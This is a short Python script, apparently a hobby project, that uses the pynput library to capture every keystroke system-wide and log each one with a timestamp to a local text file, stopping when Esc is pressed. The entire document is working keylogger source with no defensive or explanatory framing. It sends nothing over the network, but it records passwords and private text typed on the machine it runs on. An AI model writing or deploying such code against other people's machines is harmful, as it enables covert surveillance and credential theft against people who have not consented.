from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "InterestingProjects\keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def onPress(key):
    logging.info(str(key))

def onRelease(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()
